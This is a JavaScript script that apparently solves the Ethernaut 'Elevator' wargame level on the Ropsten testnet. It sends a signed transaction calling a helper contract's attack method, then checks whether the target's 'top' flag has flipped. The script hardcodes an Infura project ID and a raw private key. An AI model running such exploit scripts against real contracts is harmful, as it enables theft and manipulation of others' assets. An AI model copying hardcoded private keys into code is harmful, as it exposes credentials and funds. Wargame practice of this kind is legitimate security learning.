import Web3 from 'web3';
import fs from 'fs';
import path from 'path';
import { debugEthernaut, debugError } from './config/debug';

const infuraProvider = 'https://ropsten.infura.io/v3/ba374d41ee3f4c65ab05c31c4dd452f6';
const web3 = new Web3(infuraProvider);
const privateKey = '0x1D5906FCC19C3641DF21665D42138610A8BC33D6735BB5D06C387AE08B9CC081';
const account = web3.eth.accounts.privateKeyToAccount(privateKey);

const solArtifact = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../build/contracts/ElevatorSol.json')));
const artifact = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../build/contracts/Elevator.json')));
const address = '0x1e3c175e2cbd4dA993c586a80DE7658C264c1859';
const solAddress = solArtifact.networks['3'].address;
debugEthernaut('solAddress', solAddress);
const solContract = new web3.eth.Contract(solArtifact.abi, solAddress);
const contract = new web3.eth.Contract(artifact.abi, address);

const ethernaut = async () => {
  try {
    const estimatedGas = await await solContract.methods.attack(0).estimateGas();
    debugEthernaut('estimated gas', estimatedGas);
    const data = await solContract.methods.attack(0).encodeABI();
    debugEthernaut('data', data);
    const transaction = {
      from: account.address,
      to: solAddress,
      data,
      gasLimit: estimatedGas * 100,
      // gasPrice: web3.utils.toWei('20', 'Gwei'),
    };

    // Sign transaction
    const signedTx = await account.signTransaction(transaction);
    debugEthernaut('signedTx:\n', signedTx);
    const txResult = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
    debugEthernaut('txResult:\n', txResult);

    // Check result
    const top = await contract.methods.top().call();
    debugEthernaut('top', top);
  } catch (error) {
    debugError(error);
  }
};

ethernaut();
